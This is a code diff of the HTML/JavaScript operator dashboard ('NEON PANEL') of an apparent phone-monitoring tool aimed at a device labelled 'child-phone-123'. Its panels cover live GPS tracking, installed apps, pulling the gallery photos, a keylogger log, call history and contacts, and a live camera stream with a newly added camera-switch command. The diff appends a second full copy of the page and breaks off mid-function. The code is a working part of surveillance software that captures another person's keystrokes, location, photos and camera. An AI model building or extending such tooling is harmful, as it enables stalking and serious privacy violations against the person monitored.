-                <div class="panel-title">📍 Live GPS Location Tracker</div>
-                <div class="panel-subtitle">Real-time GPS coordinates and live interactive map explorer.</div>
-            </div>
-            <button class="force-btn" id="forceGpsBtn" onclick="forceGpsUpdate()">➤ Force GPS Update</button>
-        </div>
-
+        <div class="panel-header"><div><div class="panel-title">📍 Live GPS Location Tracker</div><div class="panel-subtitle">Real-time GPS coordinates and live interactive map explorer.</div></div><button class="force-btn" id="forceGpsBtn" onclick="forceGpsUpdate()">➤ Force GPS Update</button></div>
         <div class="gps-stats">
             <div class="stat-card"><div class="stat-label">LATITUDE</div><div class="stat-value" id="latValue">--.-------</div></div>
             <div class="stat-card"><div class="stat-label">LONGITUDE</div><div class="stat-value" id="lngValue">--.-------</div></div>
             <div class="stat-card"><div class="stat-label">ACCURACY</div><div class="stat-value green" id="accuracyValue">-- m</div></div>
             <div class="stat-card"><div class="stat-label">LAST UPDATE</div><div class="stat-value" id="lastUpdateValue">Never</div></div>
         </div>
-
-        <div class="map-container">
-            <div id="map"></div>
-            <div class="map-overlay" id="mapOverlay" style="display:none;"><div class="spinner"></div><span id="mapOverlayText">Requesting GPS location...</span></div>
-        </div>
+        <div class="map-container"><div id="map"></div><div class="map-overlay" id="mapOverlay" style="display:none;"><div class="spinner"></div><span id="mapOverlayText">Requesting GPS location...</span></div></div>
     </section>
-
     <!-- Installed Apps Panel -->
     <section class="panel" id="appsPanel" style="display:none;">
-        <div class="panel-header">
-            <div class="panel-title">▦ Installed Packages & Applications</div>
-            <button class="refresh-btn" onclick="loadDeviceInfo()">⟳ Fetch Apps</button>
-        </div>
+        <div class="panel-header"><div class="panel-title">▦ Installed Packages & Applications</div><button class="refresh-btn" onclick="loadDeviceInfo()">⟳ Fetch Apps</button></div>
         <div class="apps" id="installedAppsList">Loading apps...</div>
     </section>
-
-    <!-- Media Gallery Panel -->
+    <!-- Gallery Panel -->
     <section class="panel" id="galleryPanel" style="display:none;">
-        <div class="panel-header">
-            <div>
-                <div class="panel-title">🖼 Media Gallery & Cloud Photo Vault</div>
-                <div class="panel-subtitle">Cloud synced photos & videos from the authorized device storage.</div>
-            </div>
-        </div>
+        <div class="panel-header"><div><div class="panel-title">🖼 Media Gallery & Cloud Photo Vault</div><div class="panel-subtitle">Cloud synced photos & videos from the authorized device storage.</div></div></div>
         <div class="gallery-content">
             <div class="gallery-controls">
-                <label for="galleryCountSelect">Count:</label>
-                <select id="galleryCountSelect">
-                    <option value="10" selected>10 Photos</option>
-                    <option value="25">25 Photos</option>
-                    <option value="50">50 Photos</option>
-                    <option value="100">100 Photos</option>
-                </select>
+                <label>Count:</label><select id="galleryCountSelect"><option value="10">10 Photos</option><option value="25">25 Photos</option><option value="50">50 Photos</option><option value="100">100 Photos</option></select>
                 <button class="refresh-btn" onclick="fetchGalleryPhotos(false)">⟳ Fetch Gallery Photos</button>
                 <button class="force-btn" onclick="fetchGalleryPhotos(true)">☁ Fetch All Gallery Photos</button>
             </div>
-
             <div class="gallery-section-title">⚡ Latest Synced Photos <span class="badge" id="latestCountBadge">0</span></div>
             <div id="latestGalleryGrid" class="media-grid"></div>
-
             <div class="gallery-section-title">🗂 All Gallery Photos <span class="badge" id="allCountBadge">0</span></div>
             <div id="allGalleryGrid" class="media-grid"></div>
-
-            <div id="galleryLoading" style="display:none;">
-                <div class="skeleton-grid">
-                    <div class="skeleton-card"></div><div class="skeleton-card"></div><div class="skeleton-card"></div><div class="skeleton-card"></div>
-                </div>
-                <p style="text-align:center;color:#888;">Fetching gallery photos...</p>
-            </div>
-            <div id="galleryError" style="display:none;" class="error-message">
-                <p id="galleryErrorText">Unable to load gallery</p>
-                <button onclick="fetchGalleryPhotos(false)">Retry</button>
-            </div>
+            <div id="galleryLoading" style="display:none;"><div class="skeleton-grid"><div class="skeleton-card"></div><div class="skeleton-card"></div><div class="skeleton-card"></div><div class="skeleton-card"></div></div><p style="text-align:center;color:#888;">Fetching gallery photos...</p></div>
+            <div id="galleryError" style="display:none;" class="error-message"><p id="galleryErrorText">Unable to load gallery</p><button onclick="fetchGalleryPhotos(false)">Retry</button></div>
         </div>
     </section>
-
     <!-- Keylogger Panel -->
     <section class="panel" id="keylogPanel" style="display:none;">
-        <div class="panel-header">
-            <div class="panel-title">⌨ Keylogger</div>
-            <button class="refresh-btn" onclick="refreshKeylog()">⟳ Refresh</button>
-        </div>
+        <div class="panel-header"><div class="panel-title">⌨ Keylogger</div><button class="refresh-btn" onclick="refreshKeylog()">⟳ Refresh</button></div>
         <div class="keylog-box" id="keylogContent"></div>
     </section>
-
     <!-- Calls & Contacts Panel -->
     <section class="panel" id="callsContactsPanel" style="display:none;">
-        <div class="panel-header">
-            <div>
-                <div class="panel-title">📞 Call History & Synchronized Contacts</div>
-                <div class="panel-subtitle">Recent calls and phonebook directory from your authorized device.</div>
-            </div>
-        </div>
+        <div class="panel-header"><div><div class="panel-title">📞 Call History & Synchronized Contacts</div><div class="panel-subtitle">Recent calls and phonebook directory from your authorized device.</div></div></div>
         <div class="calls-contacts-container">
-            <!-- Recent Calls -->
-            <div class="calls-section">
-                <h2>Recent Calls <span class="badge" id="recentCallsCount">0</span></h2>
-                <div id="recentCallsList">
-                    <div class="empty-state">📵 No recent calls</div>
-                </div>
-                <button class="footer-action" onclick="alert('View All Calls')">📅 View All Calls</button>
-            </div>
-
-            <!-- Phonebook Directory -->
-            <div class="contacts-section">
-                <h2>Phonebook Directory <span class="badge" id="contactsCount">0</span></h2>
-                <div id="contactsList">
-                    <div class="empty-state">👥 No contacts found</div>
-                </div>
-                <button class="footer-action" onclick="alert('View All Contacts')">👥 View All Contacts</button>
-            </div>
+            <div class="calls-section"><h2>Recent Calls <span class="badge" id="recentCallsCount">0</span></h2><div id="recentCallsList"><div class="empty-state">📵 No recent calls</div></div><button class="footer-action" onclick="alert('View All Calls')">📅 View All Calls</button></div>
+            <div class="contacts-section"><h2>Phonebook Directory <span class="badge" id="contactsCount">0</span></h2><div id="contactsList"><div class="empty-state">👥 No contacts found</div></div><button class="footer-action" onclick="alert('View All Contacts')">👥 View All Contacts</button></div>
         </div>
     </section>
-
     <!-- Live Camera Panel -->
     <section class="panel" id="cameraPanel" style="display:none;">
-        <div class="panel-header">
-            <div>
-                <div class="panel-title">🎥 Live Camera</div>
-                <div class="panel-subtitle">Streaming from authorized device camera.</div>
-            </div>
-        </div>
+        <div class="panel-header"><div><div class="panel-title">🎥 Live Camera</div><div class="panel-subtitle">Streaming from authorized device camera.</div></div></div>
         <div class="camera-container">
-            <div class="camera-box">
-                <video id="remoteVideo" autoplay playsinline></video>
-            </div>
+            <div class="camera-box"><video id="remoteVideo" autoplay playsinline></video></div>
             <div class="camera-controls">
                 <button onclick="startLiveCamera()">📸 Start Camera</button>
+                <button onclick="switchLiveCamera()">🔄 Switch Camera</button>
                 <button onclick="stopLiveCamera()">🛑 Stop</button>
             </div>
         </div>
     </section>
-
 </main>
-
 <!-- Modal Viewer -->
 <div class="modal-viewer" id="mediaModal">
     <button class="modal-close" onclick="closeMediaViewer()">×</button>
     <div class="modal-content" id="mediaModalContent"></div>
-    <div class="modal-nav">
-        <button onclick="prevMedia()">‹ Prev</button>
-        <button onclick="nextMedia()">Next ›</button>
-    </div>
+    <div class="modal-nav"><button onclick="prevMedia()">‹ Prev</button><button onclick="nextMedia()">Next ›</button></div>
 </div>
-
 <script>
 // ================== CONFIG ==================
 const DEFAULT_CENTER = [23.8103, 90.4125];
@@ -1433,6 +615,12 @@ async function startLiveCamera() {
     }, 500);
 }
 
+function switchLiveCamera() {
+    if (cameraWs && cameraWs.readyState === WebSocket.OPEN) {
+        cameraWs.send(JSON.stringify({ type: 'switch_camera' }));
+    }
+}
+
 function stopLiveCamera() {
     if (cameraPc) { cameraPc.close(); cameraPc = null; }
     if (cameraWs) { cameraWs.close(); cameraWs = null; }
@@ -1454,6 +642,650 @@ function init() {
 }
 init();
 </script>
-
 </body>
-    </html>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Device Control</title>
+<!-- Leaflet CSS -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<!-- Leaflet JS -->
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Inter', 'Poppins', Arial, sans-serif; background: radial-gradient(circle at 30% 20%, #1a0f0f 0%, #0a0808 50%, #050505 100%); color: #eee; min-height: 100vh; }
+.header { height: 64px; border-bottom: 1px solid rgba(255, 60, 60, 0.25); display: flex; align-items: center; padding: 0 20px; gap: 10px; background: rgba(15, 10, 10, 0.92); backdrop-filter: blur(12px); position: sticky; top: 0; z-index: 20; }
+.logo { width: 36px; height: 36px; border-radius: 10px; background: #ff3338; display: flex; align-items: center; justify-content: center; font-size: 18px; box-shadow: 0 0 18px rgba(255, 50, 55, 0.35); }
+.title { font-size: 16px; font-weight: 700; letter-spacing: 0.5px; }
+.nav { display: flex; gap: 8px; margin-left: 10px; }
+.nav button { background: #171214; border: 1px solid #302126; color: #aaa; padding: 8px 13px; border-radius: 9px; cursor: pointer; font-size: 11px; transition: all 0.2s; }
+.nav button:hover { color: white; border-color: #ff3d42; background: #24181a; }
+.device-id { margin-left: auto; font-size: 10px; color: #777; }
+.live { color: #ff4646; border: 1px solid #572226; padding: 6px 9px; border-radius: 15px; font-size: 9px; background: rgba(255, 50, 55, 0.05); box-shadow: 0 0 10px rgba(255, 50, 55, 0.2); }
+.container { padding: 20px; max-width: 1200px; margin: auto; }
+.device-card { border: 1px solid #3b2529; border-radius: 18px; padding: 20px; background: rgba(22, 15, 17, 0.82); margin-bottom: 18px; backdrop-filter: blur(8px); box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4); }
+.device-name { font-size: 18px; font-weight: bold; }
+.device-status { margin-top: 8px; font-size: 12px; color: #aaa; }
+.online-dot { color: #35c76a; }
+.controls { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; }
+.control-btn { background: transparent; color: #aaa; border: 0; padding: 10px 16px; font-size: 12px; cursor: pointer; border-radius: 30px; transition: all 0.25s; border: 1px solid transparent; }
+.control-btn:hover { color: #fff; background: rgba(255, 50, 55, 0.08); }
+.control-btn.active { background: #ff3439; color: white; border-radius: 30px; box-shadow: 0 0 20px rgba(255, 50, 55, 0.5); border-color: #ff3439; }
+.panel { border: 1px solid #3b292d; border-radius: 22px; background: rgba(18, 12, 14, 0.9); overflow: hidden; margin-bottom: 20px; backdrop-filter: blur(10px); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5); }
+.panel-header { padding: 20px; border-bottom: 1px solid rgba(255, 50, 55, 0.2); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 15px; }
+.panel-title { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; }
+.panel-subtitle { font-size: 12px; color: #888; }
+.refresh-btn, .force-btn { background: #ff3439; color: white; border: none; border-radius: 30px; padding: 10px 20px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s; box-shadow: 0 0 20px rgba(255, 50, 55, 0.4); }
+.refresh-btn:hover, .force-btn:hover { background: #ff4b4f; box-shadow: 0 0 30px rgba(255, 50, 55, 0.7); transform: translateY(-1px); }
+.gps-stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; padding: 20px; }
+.stat-card { background: linear-gradient(145deg, #1e1416, #141012); border: 1px solid #2d1d20; border-radius: 18px; padding: 20px 18px; min-height: 100px; display: flex; flex-direction: column; justify-content: center; transition: transform 0.2s, box-shadow 0.2s; backdrop-filter: blur(8px); }
+.stat-card:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(255, 50, 55, 0.15); }
+.stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: #aaa; margin-bottom: 8px; }
+.stat-value { font-size: 24px; font-weight: 700; color: #fff; }
+.stat-value.green { color: #35c76a; }
+.map-container { margin: 0 20px 20px 20px; border-radius: 20px; overflow: hidden; border: 1px solid rgba(255, 50, 55, 0.3); height: 500px; position: relative; }
+#map { width: 100%; height: 100%; background: #0d0d0d; }
+.map-overlay { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(20, 12, 14, 0.9); border: 1px solid #ff3d42; border-radius: 30px; padding: 10px 20px; display: flex; align-items: center; gap: 10px; font-size: 12px; color: #fff; z-index: 500; backdrop-filter: blur(8px); box-shadow: 0 0 15px rgba(255, 50, 55, 0.3); }
+.spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #ff3439; border-radius: 50%; animation: spin 0.8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.keylog-box { background: #181214; border: 1px solid #342326; border-radius: 12px; padding: 8px; margin: 20px; display: flex; flex-direction: column; gap: 8px; max-height: 70vh; overflow-y: auto; }
+.keylog-entry { background: #120d10; border: 1px solid #6f252c; border-radius: 12px; padding: 14px 16px; width: 100%; box-sizing: border-box; display: flex; flex-direction: column; gap: 3px; box-shadow: none; }
+.keylog-title { font-family: monospace; font-size: 14px; font-weight: 600; line-height: 20px; letter-spacing: 0.2px; color: #e5e7eb; white-space: normal; overflow: visible; word-break: break-word; }
+.keylog-time { font-family: monospace; font-size: 13px; font-weight: 400; line-height: 18px; color: #8b8f98; margin: 0; }
+.apps { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 20px; }
+.app { background: linear-gradient(145deg, #21181b, #161012); border: 1px solid #302126; border-radius: 10px; padding: 14px 12px; min-height: 60px; }
+.app-name { font-size: 12px; font-weight: bold; }
+.package { margin-top: 6px; color: #666; font-size: 9px; word-break: break-all; }
+.gallery-content { margin: 20px; padding: 0; background: transparent; border: none; }
+.gallery-controls { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; background: #1a1214; border: 1px solid #2d1d20; border-radius: 14px; padding: 14px 18px; margin-bottom: 20px; }
+.gallery-controls label { color: #aaa; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
+.gallery-controls select { background: #0d0a0b; color: #fff; border: 1px solid #3b292d; border-radius: 10px; padding: 10px 14px; font-size: 13px; outline: none; cursor: pointer; min-width: 120px; }
+.gallery-section-title { font-size: 14px; font-weight: 700; margin: 20px 0 10px 0; color: #fff; }
+.badge { background: #ff3439; color: white; font-size: 10px; padding: 3px 8px; border-radius: 12px; margin-left: 8px; }
+.media-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+.media-card { background: #1a1214; border: 1px solid #2d1d20; border-radius: 12px; overflow: hidden; cursor: pointer; position: relative; }
+.media-thumb { width: 100%; height: 140px; object-fit: cover; background: #0d0d0d; }
+.media-info { padding: 10px; }
+.media-filename { font-size: 11px; font-weight: bold; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.media-meta { font-size: 9px; color: #888; margin-top: 4px; }
+.media-type-badge { position: absolute; top: 8px; right: 8px; background: rgba(0,0,0,0.7); color: #fff; font-size: 9px; padding: 3px 6px; border-radius: 8px; border: 1px solid #ff3439; }
+.skeleton-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+.skeleton-card { background: #1a1214; border: 1px solid #2d1d20; border-radius: 12px; height: 180px; animation: pulse 1.5s infinite; }
+@keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 0.9; } 100% { opacity: 0.6; } }
+.error-message { text-align: center; padding: 20px; color: #ff6b6b; }
+.error-message button { background: #ff3439; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; margin-top: 8px; }
+.modal-viewer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; display: none; align-items: center; justify-content: center; flex-direction: column; padding: 20px; }
+.modal-viewer.active { display: flex; }
+.modal-content { max-width: 90%; max-height: 80%; display: flex; align-items: center; justify-content: center; }
+.modal-content img, .modal-content video { max-width: 100%; max-height: 80vh; border-radius: 12px; border: 1px solid #ff3439; }
+.modal-close { position: absolute; top: 20px; right: 30px; background: #ff3439; color: white; border: none; font-size: 24px; width: 40px; height: 40px; border-radius: 50%; cursor: pointer; }
+.modal-nav { display: flex; gap: 20px; margin-top: 20px; }
+.modal-nav button { background: #ff3439; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; }
+.calls-contacts-container { padding: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+.calls-section, .contacts-section { background: rgba(18, 12, 14, 0.9); border: 1px solid #3b292d; border-radius: 16px; padding: 15px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); backdrop-filter: blur(10px); }
+.calls-section h2, .contacts-section h2 { font-size: 16px; font-weight: 700; margin-bottom: 15px; color: #fff; }
+.call-card, .contact-card { background: #120d10; border: 1px solid #6f252c; border-radius: 14px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; transition: transform 0.2s, box-shadow 0.2s; }
+.call-card:hover, .contact-card:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(255,50,55,0.1); }
+.avatar { width: 40px; height: 40px; border-radius: 50%; background: #2a1d20; border: 1px solid #6f252c; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px; color: #fff; }
+.call-info, .contact-info { flex: 1; }
+.call-name, .contact-name { font-size: 13px; font-weight: 600; color: #fff; }
+.call-number, .contact-number { font-size: 11px; color: #e5e7eb; margin-top: 3px; }
+.call-badge { padding: 4px 10px; border-radius: 12px; font-size: 10px; font-weight: 600; white-space: nowrap; }
+.incoming { background: rgba(69,232,93,.08); color: #35c76a; border: 1px solid rgba(69,232,93,.25); }
+.outgoing { background: rgba(19,199,232,.08); color: #13c7e8; border: 1px solid rgba(19,199,232,.25); }
+.missed { background: rgba(255,70,90,.08); color: #ff7180; border: 1px solid rgba(255,70,90,.25); }
+.call-duration { font-size: 10px; color: #888; margin-top: 3px; }
+.call-time { font-size: 10px; color: #888; margin-left: 8px; }
+.contact-actions { display: flex; gap: 8px; }
+.contact-action-btn { background: transparent; border: 1px solid #6f252c; border-radius: 8px; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #ff3439; }
+.contact-action-btn:hover { background: rgba(255,50,55,0.1); border-color: #ff3439; }
+.empty-state { text-align: center; padding: 25px; color: #aaa; font-size: 13px; }
+.footer-action { width: 100%; margin-top: 10px; padding: 10px; background: transparent; border: 1px solid #6f252c; border-radius: 10px; color: #ff3439; font-size: 12px; font-weight: 600; cursor: pointer; }
+.footer-action:hover { background: rgba(255,50,55,0.08); border-color: #ff3439; }
+.camera-container { padding: 20px; display: flex; flex-direction: column; align-items: center; gap: 15px; }
+.camera-box { width: 100%; max-width: 800px; height: 500px; background: #120d10; border: 1px solid #6f252c; border-radius: 16px; display: flex; align-items: center; justify-content: center; color: #888; }
+#remoteVideo { width: 100%; height: 100%; object-fit: contain; border-radius: 16px; }
+.camera-controls button { background: #ff3439; color: white; border: none; border-radius: 30px; padding: 12px 24px; font-weight: 600; cursor: pointer; margin: 5px; }
+@media(max-width: 900px) { .calls-contacts-container { grid-template-columns: 1fr; } .gps-stats { grid-template-columns: repeat(2,1fr); } .apps { grid-template-columns: repeat(2,1fr); } .media-grid,.skeleton-grid { grid-template-columns: repeat(3,1fr); } }
+@media(max-width: 600px) { .header { flex-wrap: wrap; height: auto; padding: 10px; } .nav { overflow-x: auto; width: 100%; order: 3; } .container { padding: 10px; } .gps-stats { grid-template-columns: repeat(2,1fr); gap: 10px; } .map-container { height: 350px; margin: 0 10px 10px 10px; } .media-grid,.skeleton-grid { grid-template-columns: repeat(2,1fr); } .keylog-entry { padding: 12px; } .call-card,.contact-card { flex-wrap: wrap; } .contact-actions { margin-left: auto; } }
+</style>
+</head>
+<body>
+<header class="header">
+    <div class="logo">⌁</div>
+    <div class="title">NEON PANEL</div>
+    <div class="nav">
+        <button onclick="location.href='/dashboard'">⌂ Home</button>
+        <button onclick="location.href='/dashboard'">← Dashboard</button>
+    </div>
+    <div class="device-id" id="deviceIdDisplay">DEVICE ID: <b>child-phone-123</b></div>
+    <div class="live">● LIVE LINK</div>
+</header>
+<main class="container">
+    <section class="device-card">
+        <div class="device-name" id="deviceName">📱 Loading...</div>
+        <div class="device-status"><span class="online-dot">●</span><span id="deviceStatusText">Loading...</span>&nbsp; • &nbsp; Battery <span id="batteryLevel">—</span>%</div>
+    </section>
+    <div class="controls">
+        <button class="control-btn" onclick="showApps(this)">▦ Installed Apps</button>
+        <button class="control-btn" onclick="showGPS(this)">📍 GPS Tracker</button>
+        <button class="control-btn" onclick="showGallery(this)">🖼 Media Gallery</button>
+        <button class="control-btn" onclick="showKeylog(this)">⌨ Keylogger</button>
+        <button class="control-btn" onclick="showCallsContacts(this)">📞 Calls & Contacts</button>
+        <button class="control-btn" onclick="showCamera(this)">🎥 Live Camera</button>
+    </div>
+    <!-- GPS Panel -->
+    <section class="panel" id="gpsPanel">
+        <div class="panel-header"><div><div class="panel-title">📍 Live GPS Location Tracker</div><div class="panel-subtitle">Real-time GPS coordinates and live interactive map explorer.</div></div><button class="force-btn" id="forceGpsBtn" onclick="forceGpsUpdate()">➤ Force GPS Update</button></div>
+        <div class="gps-stats">
+            <div class="stat-card"><div class="stat-label">LATITUDE</div><div class="stat-value" id="latValue">--.-------</div></div>
+            <div class="stat-card"><div class="stat-label">LONGITUDE</div><div class="stat-value" id="lngValue">--.-------</div></div>
+            <div class="stat-card"><div class="stat-label">ACCURACY</div><div class="stat-value green" id="accuracyValue">-- m</div></div>
+            <div class="stat-card"><div class="stat-label">LAST UPDATE</div><div class="stat-value" id="lastUpdateValue">Never</div></div>
+        </div>
+        <div class="map-container"><div id="map"></div><div class="map-overlay" id="mapOverlay" style="display:none;"><div class="spinner"></div><span id="mapOverlayText">Requesting GPS location...</span></div></div>
+    </section>
+    <!-- Installed Apps Panel -->
+    <section class="panel" id="appsPanel" style="display:none;">
+        <div class="panel-header"><div class="panel-title">▦ Installed Packages & Applications</div><button class="refresh-btn" onclick="loadDeviceInfo()">⟳ Fetch Apps</button></div>
+        <div class="apps" id="installedAppsList">Loading apps...</div>
+    </section>
+    <!-- Gallery Panel -->
+    <section class="panel" id="galleryPanel" style="display:none;">
+        <div class="panel-header"><div><div class="panel-title">🖼 Media Gallery & Cloud Photo Vault</div><div class="panel-subtitle">Cloud synced photos & videos from the authorized device storage.</div></div></div>
+        <div class="gallery-content">
+            <div class="gallery-controls">
+                <label>Count:</label><select id="galleryCountSelect"><option value="10">10 Photos</option><option value="25">25 Photos</option><option value="50">50 Photos</option><option value="100">100 Photos</option></select>
+                <button class="refresh-btn" onclick="fetchGalleryPhotos(false)">⟳ Fetch Gallery Photos</button>
+                <button class="force-btn" onclick="fetchGalleryPhotos(true)">☁ Fetch All Gallery Photos</button>
+            </div>
+            <div class="gallery-section-title">⚡ Latest Synced Photos <span class="badge" id="latestCountBadge">0</span></div>
+            <div id="latestGalleryGrid" class="media-grid"></div>
+            <div class="gallery-section-title">🗂 All Gallery Photos <span class="badge" id="allCountBadge">0</span></div>
+            <div id="allGalleryGrid" class="media-grid"></div>
+            <div id="galleryLoading" style="display:none;"><div class="skeleton-grid"><div class="skeleton-card"></div><div class="skeleton-card"></div><div class="skeleton-card"></div><div class="skeleton-card"></div></div><p style="text-align:center;color:#888;">Fetching gallery photos...</p></div>
+            <div id="galleryError" style="display:none;" class="error-message"><p id="galleryErrorText">Unable to load gallery</p><button onclick="fetchGalleryPhotos(false)">Retry</button></div>
+        </div>
+    </section>
+    <!-- Keylogger Panel -->
+    <section class="panel" id="keylogPanel" style="display:none;">
+        <div class="panel-header"><div class="panel-title">⌨ Keylogger</div><button class="refresh-btn" onclick="refreshKeylog()">⟳ Refresh</button></div>
+        <div class="keylog-box" id="keylogContent"></div>
+    </section>
+    <!-- Calls & Contacts Panel -->
+    <section class="panel" id="callsContactsPanel" style="display:none;">
+        <div class="panel-header"><div><div class="panel-title">📞 Call History & Synchronized Contacts</div><div class="panel-subtitle">Recent calls and phonebook directory from your authorized device.</div></div></div>
+        <div class="calls-contacts-container">
+            <div class="calls-section"><h2>Recent Calls <span class="badge" id="recentCallsCount">0</span></h2><div id="recentCallsList"><div class="empty-state">📵 No recent calls</div></div><button class="footer-action" onclick="alert('View All Calls')">📅 View All Calls</button></div>
+            <div class="contacts-section"><h2>Phonebook Directory <span class="badge" id="contactsCount">0</span></h2><div id="contactsList"><div class="empty-state">👥 No contacts found</div></div><button class="footer-action" onclick="alert('View All Contacts')">👥 View All Contacts</button></div>
+        </div>
+    </section>
+    <!-- Live Camera Panel -->
+    <section class="panel" id="cameraPanel" style="display:none;">
+        <div class="panel-header"><div><div class="panel-title">🎥 Live Camera</div><div class="panel-subtitle">Streaming from authorized device camera.</div></div></div>
+        <div class="camera-container">
+            <div class="camera-box"><video id="remoteVideo" autoplay playsinline></video></div>
+            <div class="camera-controls">
+                <button onclick="startLiveCamera()">📸 Start Camera</button>
+                <button onclick="switchLiveCamera()">🔄 Switch Camera</button>
+                <button onclick="stopLiveCamera()">🛑 Stop</button>
+            </div>
+        </div>
+    </section>
+</main>
+<!-- Modal Viewer -->
+<div class="modal-viewer" id="mediaModal">
+    <button class="modal-close" onclick="closeMediaViewer()">×</button>
+    <div class="modal-content" id="mediaModalContent"></div>
+    <div class="modal-nav"><button onclick="prevMedia()">‹ Prev</button><button onclick="nextMedia()">Next ›</button></div>
+</div>
+<script>
+// ================== CONFIG ==================
+const DEFAULT_CENTER = [23.8103, 90.4125];
+const DEFAULT_ZOOM = 13;
+let map;
+let marker = null;
+let currentDeviceId = getDeviceId();
+let galleryItems = [];
+let currentMediaIndex = -1;
+
+// ================== UTILITY ==================
+function getDeviceId() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get("deviceId") || "child-phone-123";
+}
+function escapeHtml(value) {
+    return String(value).replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;").replaceAll('"',"&quot;").replaceAll("'","&#039;");
+}
+
+// ================== LOCALSTORAGE HELPERS ==================
+function getLastKnownLocation(deviceId) {
+    const key = "lastGpsLocation_" + deviceId;
+    const stored = localStorage.getItem(key);
+    if (stored) {
+        try { return JSON.parse(stored); } catch (e) { return null; }
+    }
+    return null;
+}
+function saveLastKnownLocation(deviceId, location) {
+    localStorage.setItem("lastGpsLocation_" + deviceId, JSON.stringify(location));
+}
+
+// ================== MAP INIT ==================
+function initMap() {
+    if (map) return;
+    map = L.map('map', { center: DEFAULT_CENTER, zoom: DEFAULT_ZOOM, zoomControl: true });
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; OpenStreetMap contributors',
+        maxZoom: 19
+    }).addTo(map);
+}
+
+// ================== MARKER HELPERS ==================
+function createOrUpdateMarker(lat, lng, popupContent) {
+    const icon = L.divIcon({
+        className: 'custom-marker',
+        html: '<div style="background:#ff3439; width:14px; height:14px; border-radius:50%; border:2px solid #fff; box-shadow:0 0 10px #ff3439;"></div>',
+        iconSize: [18, 18],
+        iconAnchor: [9, 9]
+    });
+    if (!marker) {
+        marker = L.marker([lat, lng], { icon }).addTo(map);
+    } else {
+        marker.setLatLng([lat, lng]);
+        marker.setIcon(icon);
+    }
+    marker.bindPopup(popupContent).openPopup();
+}
+function removeMarker() {
+    if (marker) { map.removeLayer(marker); marker = null; }
+}
+
+// ================== OVERLAY HELPERS ==================
+function showOverlayWithSpinner(text) {
+    const overlay = document.getElementById("mapOverlay");
+    const textEl = document.getElementById("mapOverlayText");
+    if (overlay && textEl) {
+        overlay.innerHTML = `<div class="spinner"></div><span>${text}</span>`;
+        overlay.style.display = "flex";
+    }
+}
+function showOverlayText(text) {
+    const overlay = document.getElementById("mapOverlay");
+    const textEl = document.getElementById("mapOverlayText");
+    if (overlay && textEl) {
+        overlay.innerHTML = `<span>${text}</span>`;
+        overlay.style.display = "flex";
+    }
+}
+function hideOverlay() {
+    const overlay = document.getElementById("mapOverlay");
+    if (overlay) overlay.style.display = "none";
+}
+
+// ================== DATA FETCH ==================
+async function loadDeviceInfo(showLoadingOverlay = false) {
+    const deviceId = getDeviceId();
+    document.getElementById("deviceIdDisplay").innerHTML = `DEVICE ID: <b>${escapeHtml(deviceId)}</b>`;
+    if (showLoadingOverlay) showOverlayWithSpinner("Requesting GPS location...");
+    try {
+        const response = await fetch(`/api/device-state?deviceId=${deviceId}`);
+        if (!response.ok) throw new Error("Failed to fetch device state");
+        const data = await response.json();
+        document.getElementById("deviceName").textContent = "📱 " + (data.deviceName || "Unknown Device");
+        document.getElementById("batteryLevel").textContent = data.battery ?? 0;
+        const isOnline = data.last_seen && Date.now() - data.last_seen < 120000;
+        document.getElementById("deviceStatusText").textContent = isOnline ? "Online" : "Offline";
+        document.getElementById("deviceStatusText").className = isOnline ? "online-dot" : "";
+        if (document.getElementById("installedAppsList")) renderInstalledApps(data.installedApps || []);
+        updateGPSData(data);
+        hideOverlay();
+        return data;
+    } catch (e) {
+        console.error(e);
+        document.getElementById("deviceName").textContent = "📱 Error loading device info";
+        document.getElementById("batteryLevel").textContent = "—";
+        document.getElementById("deviceStatusText").textContent = "Error";
+        document.getElementById("deviceStatusText").className = "";
+        document.getElementById("installedAppsList").innerHTML = `<div class="app">Failed to load apps</div>`;
+        hideOverlay();
+        showOverlayText("GPS location unavailable");
+        setTimeout(hideOverlay, 3000);
+        throw e;
+    }
+}
+
+function updateGPSData(data) {
+    const deviceId = getDeviceId();
+    const lat = data.latitude ?? null;
+    const lng = data.longitude ?? null;
+    const accuracy = data.accuracy ?? null;
